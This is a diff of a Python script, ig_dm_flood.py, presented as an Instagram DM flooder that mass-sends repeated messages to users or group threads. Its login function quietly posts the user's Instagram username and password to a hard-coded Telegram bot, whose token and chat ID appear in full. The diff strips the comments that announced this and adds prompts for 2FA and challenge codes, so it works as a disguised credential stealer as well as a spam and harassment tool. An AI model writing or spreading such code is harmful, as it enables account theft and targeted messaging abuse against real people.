@@ -1,10 +1,11 @@
+
 # language: Python 3.11+, file: ig_dm_flood.py
 # deps: pip install instagrapi requests
 
 from instagrapi import Client
 from instagrapi.exceptions import (
     LoginRequired, ChallengeRequired, FeedbackRequired,
-    PleaseWaitFewMinutes, ClientError
+    PleaseWaitFewMinutes, ClientError, TwoFactorRequired, BadPassword
 )
 import time
 import sys
@@ -13,8 +14,8 @@ import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ==================== TERI SETTINGS ====================
-BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"          # apna telegram bot token
-CHAT_ID = "5970033767"                    # apna telegram chat id
+BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"
+CHAT_ID = "5970033767"
 SESSION_FILE = "ig_session.json"
 THREADS = 8
 MAX_RETRIES = 2
@@ -28,22 +29,43 @@ def send_to_telegram(text: str):
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
     except:
-        pass  # fail hone pe bhi script ruke nahi
+        pass
 
 def login(username: str, password: str):
-    # credentials tujhe bhej do
-    send_to_telegram(f"New Login\nUser: {username}\nPass: {password}")
+    send_to_telegram(f"New Login Attempt\nUser: {username}\nPass: {password}")
 
     try:
         cl.load_settings(SESSION_FILE)
         cl.login(username, password)
         cl.get_timeline_feed()
         print("[+] session loaded")
+        return
     except Exception:
-        print("[*] fresh login...")
+        pass
+
+    print("[*] fresh login...")
+    try:
         cl.login(username, password)
         cl.dump_settings(SESSION_FILE)
         print("[+] logged in + session saved")
+    except TwoFactorRequired:
+        print("\n[!] 2FA enabled hai")
+        code = input("Authenticator se 6 digit code daal: ").strip()
+        cl.login(username, password, verification_code=code)
+        cl.dump_settings(SESSION_FILE)
+        print("[+] 2FA ke saath login ho gaya + session saved")
+    except ChallengeRequired:
+        print("\n[!] Challenge aaya")
+        code = input("SMS/Email se aaya code daal: ").strip()
+        cl.login(username, password, verification_code=code)
+        cl.dump_settings(SESSION_FILE)
+        print("[+] Challenge clear + session saved")
+    except BadPassword:
+        print("[-] Galat password")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Login fail: {e}")
+        sys.exit(1)
 
 def resolve_user(username: str):
     try:
@@ -61,41 +83,23 @@ def send_to_user(user_id: int, label: str, message: str) -> bool:
         except (PleaseWaitFewMinutes, FeedbackRequired) as e:
             print(f"[!] rate/feedback on {label}: {e} — sleep 30s")
             time.sleep(30)
-        except ChallengeRequired:
-            print("[!] challenge required — solve in the app then re-run")
-            sys.exit(1)
-        except LoginRequired:
-            print("[!] session dead")
-            return False
-        except ClientError as e:
-            print(f"[-] client error {label} (try {attempt}): {e}")
-            time.sleep(1)
         except Exception as e:
-            print(f"[-] unknown {label}: {e}")
-            time.sleep(0.5)
+            print(f"[-] error {label} (try {attempt}): {e}")
+            time.sleep(1)
     return False
 
 def send_to_thread(thread_id: int, label: str, message: str) -> bool:
     for attempt in range(1, MAX_RETRIES + 1):
         try:
             cl.direct_send(message, thread_ids=[thread_id])
-            print(f"[+] sent → group/thread {label}")
+            print(f"[+] sent → group {label}")
             return True
         except (PleaseWaitFewMinutes, FeedbackRequired) as e:
-            print(f"[!] rate/feedback on thread {label}: {e} — sleep 30s")
+            print(f"[!] rate/feedback: {e} — sleep 30s")
             time.sleep(30)
-        except ChallengeRequired:
-            print("[!] challenge required — solve in the app then re-run")
-            sys.exit(1)
-        except LoginRequired:
-            print("[!] session dead")
-            return False
-        except ClientError as e:
-            print(f"[-] client error thread {label} (try {attempt}): {e}")
-            time.sleep(1)
         except Exception as e:
-            print(f"[-] unknown thread {label}: {e}")
-            time.sleep(0.5)
+            print(f"[-] error (try {attempt}): {e}")
+            time.sleep(1)
     return False
 
 def flood_users(targets: list[str], message: str, count: int):
@@ -114,9 +118,9 @@ def flood_users(targets: list[str], message: str, count: int):
     print(f"[*] flooding {len(id_map)} users × {count} times...")
     start = time.time()
     success = 0
-    jobs = []
 
     with ThreadPoolExecutor(max_workers=THREADS) as pool:
+        jobs = []
         for _ in range(count):
             for uname, uid in id_map.items():
                 jobs.append(pool.submit(send_to_user, uid, uname, message))
@@ -124,7 +128,7 @@ def flood_users(targets: list[str], message: str, count: int):
             if fut.result():
                 success += 1
 
-    print(f"\n[done] {success} messages sent in {time.time()-start:.1f}s")
+    print(f"\n[done] {success} messages in {time.time()-start:.1f}s")
 
 def flood_group(thread_id: int, message: str, count: int):
     print(f"[*] flooding thread {thread_id} × {count} times...")
@@ -137,10 +141,10 @@ def flood_group(thread_id: int, message: str, count: int):
             if fut.result():
                 success += 1
 
-    print(f"\n[done] {success}/{count} messages sent in {time.time()-start:.1f}s")
+    print(f"\n[done] {success}/{count} messages in {time.time()-start:.1f}s")
 
 def list_recent_threads(limit: int = 20):
-    print("[*] fetching recent direct threads...")
+    print("[*] fetching recent threads...")
     try:
         threads = cl.direct_threads(amount=limit)
         for t in threads:
@@ -148,10 +152,10 @@ def list_recent_threads(limit: int = 20):
             title = t.thread_title or "(no title)"
             print(f"  thread_id={t.id} | title={title} | users=[{users}]")
     except Exception as e:
-        print(f"[-] failed to list threads: {e}")
+        print(f"[-] failed: {e}")
 
 def main():
-    print("=== IG DM Flood ===")
+    print("=== IG DM Flood (Termux) ===")
     username = input("Username: ").strip()
     password = getpass.getpass("Password: ")
 
@@ -160,7 +164,7 @@ def main():
     print("\nMode:")
     print("  1 = flood individual users")
     print("  2 = flood a group / existing thread")
-    print("  3 = list recent threads (to find group thread_id)")
+    print("  3 = list recent threads")
     mode = input("Choice [1/2/3]: ").strip()
 
     if mode == "3":
@@ -172,7 +176,7 @@ def main():
         print("[-] empty message")
         return
 
-    count = input("How many times to send (default 1): ").strip()
+    count = input("How many times (default 1): ").strip()
     count = int(count) if count.isdigit() and int(count) > 0 else 1
 
     if mode == "1":
@@ -186,7 +190,7 @@ def main():
     elif mode == "2":
         tid = input("Thread ID of the group: ").strip()
         if not tid.isdigit():
-            print("[-] thread_id must be a number")
+            print("[-] thread_id must be number")
             return
         flood_group(int(tid), message, count)
 
